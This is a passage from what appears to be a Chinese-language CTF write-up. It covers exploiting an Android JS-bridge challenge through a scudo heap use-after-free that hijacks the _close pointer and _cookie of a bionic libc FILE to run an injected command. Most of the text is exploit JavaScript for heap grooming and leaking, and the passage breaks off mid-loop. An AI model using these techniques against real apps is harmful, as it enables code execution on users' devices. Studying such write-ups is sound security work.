</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">chunk_ct </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">chunk_ct</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">slice</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xa0</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">) + </span><span style="color:#8fa1b3;">convertToASCII</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">cmd</span><span style="color:#c0c5ce;">)+&quot;</span><span style="color:#a3be8c;">00</span><span style="color:#c0c5ce;">&quot; + </span><span style="color:#bf616a;">chunk_ct</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">slice</span><span style="color:#c0c5ce;">((</span><span style="color:#d08770;">0x50</span><span style="color:#c0c5ce;">)*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">chunk_ct</span><span style="color:#c0c5ce;">.length*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    
</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">edit</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">control_idx</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">chunk_ct</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">closefile</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">while</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) {}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">&lt;/</span><span style="color:#bf616a;">script</span><span style="color:#c0c5ce;">&gt;
</span></pre>
<h2 id="scudo">scudo</h2><p>原来不需要打堆管理，利用的是uaf劫持binoic libc中file结构体的指针，劫持<code>_close</code>函数指针，并且修改<code>_cookie</code>指向可控地址</p>
<p>涉及堆块classID=0x14，大小0xa00-0xa10，比较神奇的是好像这个堆块里有好几个相关结构体内容和指针，而且调试看每次调用的是哪一个指针还不太一样。直接把所有相关的指针都改掉就行</p>
<p>binoic libc相关代码如下，劫持<code>(*fp-&gt;_close)(fp-&gt;_cookie)</code></p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">// fopen
</span><span style="color:#c0c5ce;">FILE *
</span><span style="color:#8fa1b3;">fopen</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">file</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">mode</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	FILE *fp;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> f;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> flags, oflags;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((flags = </span><span style="color:#8fa1b3;">__sflags</span><span style="color:#c0c5ce;">(mode, &amp;oflags)) == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((fp = </span><span style="color:#8fa1b3;">__sfp</span><span style="color:#c0c5ce;">()) == </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((f = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(file, oflags, DEFFILEMODE)) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">		fp-&gt;_flags = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;			</span><span style="color:#65737e;">/* release */
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">	fp-&gt;_file = f;
</span><span style="color:#c0c5ce;">	fp-&gt;_flags = flags;
</span><span style="color:#c0c5ce;">	fp-&gt;_cookie = fp;
</span><span style="color:#c0c5ce;">	fp-&gt;_read = __sread;
</span><span style="color:#c0c5ce;">	fp-&gt;_write = __swrite;
</span><span style="color:#c0c5ce;">	fp-&gt;_seek = __sseek;
</span><span style="color:#c0c5ce;">	fp-&gt;_close = __sclose;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/*
</span><span style="color:#65737e;">	 * When opening in append mode, even though we use O_APPEND,
</span><span style="color:#65737e;">	 * we need to seek to the end so that ftell() gets the right
</span><span style="color:#65737e;">	 * answer.  If the user then alters the seek pointer, or
</span><span style="color:#65737e;">	 * the file extends, this will fail, but there is not much
</span><span style="color:#65737e;">	 * we can do about this.  (We could set __SAPP and check in
</span><span style="color:#65737e;">	 * fseek and ftell.)
</span><span style="color:#65737e;">	 */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(oflags &amp; O_APPEND)
</span><span style="color:#c0c5ce;">		(</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">) </span><span style="color:#8fa1b3;">__sseek</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)fp, (fpos_t)</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, SEEK_END);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">(fp);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;">// fclose
</span><span style="color:#b48ead;">int
</span><span style="color:#8fa1b3;">fclose</span><span style="color:#c0c5ce;">(FILE *</span><span style="color:#bf616a;">fp</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> r;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(fp-&gt;_flags == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {	</span><span style="color:#65737e;">/* not open! */
</span><span style="color:#c0c5ce;">		errno = EBADF;
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">(EOF);
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">FLOCKFILE</span><span style="color:#c0c5ce;">(fp);
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">WCIO_FREE</span><span style="color:#c0c5ce;">(fp);
</span><span style="color:#c0c5ce;">	r = fp-&gt;_flags &amp; __SWR ? </span><span style="color:#8fa1b3;">__sflush</span><span style="color:#c0c5ce;">(fp) : </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(fp-&gt;_close != </span><span style="color:#d08770;">NULL </span><span style="color:#c0c5ce;">&amp;&amp; (*fp-&gt;_close)(fp-&gt;_cookie) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">		r = EOF;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(fp-&gt;_flags &amp; __SMBF)
</span><span style="color:#c0c5ce;">		</span><span style="color:#96b5b4;">free</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*)fp-&gt;_bf.</span><span style="color:#bf616a;">_base</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">HASUB</span><span style="color:#c0c5ce;">(fp))
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">FREEUB</span><span style="color:#c0c5ce;">(fp);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">HASLB</span><span style="color:#c0c5ce;">(fp))
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">FREELB</span><span style="color:#c0c5ce;">(fp);
</span><span style="color:#c0c5ce;">	fp-&gt;_r = fp-&gt;_w = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;	</span><span style="color:#65737e;">/* Mess up if reaccessed. */
</span><span style="color:#c0c5ce;">	fp-&gt;_flags = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;		</span><span style="color:#65737e;">/* Release this FILE for reuse. */
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">FUNLOCKFILE</span><span style="color:#c0c5ce;">(fp);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">(r);
</span><span style="color:#c0c5ce;">}
</span></pre>
<h3 id="exp">exp</h3><pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">&lt;</span><span style="color:#bf616a;">script</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">LEToHex64</span><span style="color:#c0c5ce;">(number) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">hex </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">number</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">toString</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">hex</span><span style="color:#c0c5ce;">.length % </span><span style="color:#d08770;">2 </span><span style="color:#c0c5ce;">!== </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">hex </span><span style="color:#c0c5ce;">= &#39;</span><span style="color:#a3be8c;">0</span><span style="color:#c0c5ce;">&#39; + </span><span style="color:#bf616a;">hex</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">hex</span><span style="color:#c0c5ce;">.length &lt; </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">hex </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">hex</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">padStart</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">, &#39;</span><span style="color:#a3be8c;">0</span><span style="color:#c0c5ce;">&#39;);
</span><span style="color:#c0c5ce;">        } </span><span style="color:#b48ead;">else if </span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">hex</span><span style="color:#c0c5ce;">.length &gt; </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">hex </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">hex</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">slice</span><span style="color:#c0c5ce;">(-</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">bytes </span><span style="color:#c0c5ce;">= [];
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">&lt; </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">+= </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">bytes</span><span style="color:#c0c5ce;">.</span><span style="color:#96b5b4;">push</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">hex</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">slice</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">+ </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">));
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">bytes</span><span style="color:#c0c5ce;">.</span><span style="color:#96b5b4;">reverse</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">bytes</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">join</span><span style="color:#c0c5ce;">(&#39;&#39;).</span><span style="color:#8fa1b3;">toUpperCase</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">hexToLE64</span><span style="color:#c0c5ce;">(hexString){
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">ret </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#bf616a;">n</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">&gt;= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">--) {
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">ret </span><span style="color:#c0c5ce;">&lt;&lt;= </span><span style="color:#d08770;">8</span><span style="color:#bf616a;">n</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">ret </span><span style="color:#c0c5ce;">|= </span><span style="color:#8fa1b3;">BigInt</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">parseInt</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">hexString</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">slice</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">),</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">));
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">ret</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">genNStr</span><span style="color:#c0c5ce;">(s, n){
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">res </span><span style="color:#c0c5ce;">= &#39;&#39;;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">&lt; </span><span style="color:#bf616a;">n</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">++)
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">res</span><span style="color:#c0c5ce;">+= </span><span style="color:#bf616a;">s</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">res</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">genKey</span><span style="color:#c0c5ce;">(index){
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">key </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">toString</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">key</span><span style="color:#c0c5ce;">.length == </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">){
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">key </span><span style="color:#c0c5ce;">= &quot;</span><span style="color:#a3be8c;">30</span><span style="color:#c0c5ce;">&quot;+</span><span style="color:#bf616a;">key</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">charCodeAt</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">).</span><span style="color:#8fa1b3;">toString</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">else</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">key </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">key</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">charCodeAt</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">).</span><span style="color:#8fa1b3;">toString</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">)+</span><span style="color:#bf616a;">key</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">charCodeAt</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">).</span><span style="color:#8fa1b3;">toString</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">key</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">convertToASCII</span><span style="color:#c0c5ce;">(str) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">result </span><span style="color:#c0c5ce;">= &quot;&quot;;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">&lt; </span><span style="color:#bf616a;">str</span><span style="color:#c0c5ce;">.length; </span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">++) {
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">result </span><span style="color:#c0c5ce;">+= </span><span style="color:#bf616a;">str</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">charCodeAt</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">).</span><span style="color:#8fa1b3;">toString</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">result</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">debug1_idx </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">49</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#96b5b4;">add</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">debug1_idx</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">GG</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">0x18</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">edit</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">debug1_idx</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">LEToHex64</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x11223344</span><span style="color:#bf616a;">n</span><span style="color:#c0c5ce;">));
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">index </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">index </span><span style="color:#c0c5ce;">&lt; </span><span style="color:#d08770;">20</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">++){
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">s_index </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">toString</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">s_index</span><span style="color:#c0c5ce;">.length == </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">){
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">s_index </span><span style="color:#c0c5ce;">= &quot;</span><span style="color:#a3be8c;">0</span><span style="color:#c0c5ce;">&quot;+</span><span style="color:#bf616a;">s_index</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#96b5b4;">add</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">AB</span><span style="color:#c0c5ce;">&quot;+</span><span style="color:#bf616a;">s_index</span><span style="color:#c0c5ce;">+&quot;</span><span style="color:#96b5b4;">\x61</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">0xa08</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">index </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">index </span><span style="color:#c0c5ce;">&lt; </span><span style="color:#d08770;">20</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">++){
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">delete</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#96b5b4;">add</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">20</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">GG</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">0xa08</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">index </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">index </span><span style="color:#c0c5ce;">&lt; </span><span style="color:#d08770;">20</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">++){
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">delete</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">libc_base </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">BigInt</span><span style="color:#c0c5ce;">(-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">heap_addr </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">BigInt</span><span style="color:#c0c5ce;">(-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">control_idx </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">20</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">while</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">libc_base </span><span style="color:#c0c5ce;">== -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">){
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">index </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">index </span><span style="color:#c0c5ce;">&lt; </span><span style="color:#d08770;">20</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">++){
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">openfile</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">D</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">content </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">show</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">20</span><span style="color:#c0c5ce;">+</span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xa08</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">);
